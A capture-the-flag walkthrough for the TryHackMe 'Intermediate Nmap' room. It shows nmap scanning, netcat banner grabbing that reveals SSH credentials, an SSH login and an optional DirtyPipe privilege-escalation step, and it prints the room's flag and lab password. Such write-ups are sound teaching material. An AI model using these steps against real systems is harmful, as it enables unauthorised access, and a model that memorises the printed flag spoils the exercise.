# Intermediate Nmap - TryHackMe Walkthrough

## Machine Information
- **Platform:** TryHackMe
- **Difficulty:** Easy
- **OS:** Linux
- **Target IP:** 10.48.152.48
- **Room:** tryhackme.com/room/intermediatenmap

## Flag
- **Command:** `cat /home/user/flag.txt`
- **FLAG:** `flag{251f309497a18888dde5222761ea88e4}`

---

## Reconnaissance

### Port Scan
```
nmap -sC -sV -p- 10.48.152.48 -T4
```

**Open Ports:**
| Port   | Service        | Version                     |
|--------|---------------|-----------------------------|
| 22     | SSH           | OpenSSH 8.2p1 Ubuntu       |
| 2222   | SSH           | OpenSSH 8.2p1 Ubuntu        |
| 31337  | Elite/Unknown | Banner grabbing reveals creds |

---

## Enumeration

### Nmap Service Detection
The high port 31337 returns interesting data:
```
nmap -sT -T4 10.48.152.48 -p 31337
```

**Banner Output:**
```
In case I forget - user:pass
ubuntu:Dafdas!!/str0ng
```

---

## Initial Access

### Banner Grabbing with Netcat
```bash
nc 10.48.152.48 31337
```

Output:
```
In case I forget - user:pass
ubuntu:Dafdas!!/str0ng
```

### SSH Login
```bash
ssh ubuntu@10.48.152.48
# Password: Dafdas!!/str0ng
```

---

## Finding the Flag

### User Flag
```bash
cat /home/user/flag.txt
# Output: flag{...}
```

---

## Privilege Escalation (Optional)

The target may be vulnerable to DirtyPipe (CVE-2022-0847).

### Method
1. Find SUID binaries:
```bash
find / -perm -4000 2>/dev/null
```

2. Exploit using DirtyPipe:
```bash
gcc dirtypipez.c -o dirtypipez
./dirtypipez /usr/bin/chfn
```

---

## Tools Used
- nmap (port scanning, service detection)
- netcat (banner grabbing)
- SSH (remote access)

## Key Techniques Learned
1. **Nmap Service Detection** - Using `-sV` to detect service versions
2. **High Port Enumeration** - Non-standard ports often contain interesting services
3. **Banner Grabbing** - Using netcat to retrieve service information
4. **Credential Reuse** - Using found credentials for SSH access

## Lessons Learned
- Always scan ALL ports, not just common ones
- High ports can contain valuable information (credentials, banners)
- Banner grabbing is essential for enumeration
- Default SSH on port 22 may not work; check alternate ports like 2222


---

## Solution Summary

**Flag:** `flag{251f309497a18888dde5222761ea88e4}`

**Credentials Found:**
- Username: `ubuntu`
- Password: `Dafdas!!/str0ng`

**Access Method:**
1. Full port scan reveals hidden port 31337
2. Banner grabbing on port 31337 reveals SSH credentials
3. SSH into port 22 with found credentials
4. Read flag from `/home/user/flag.txt`
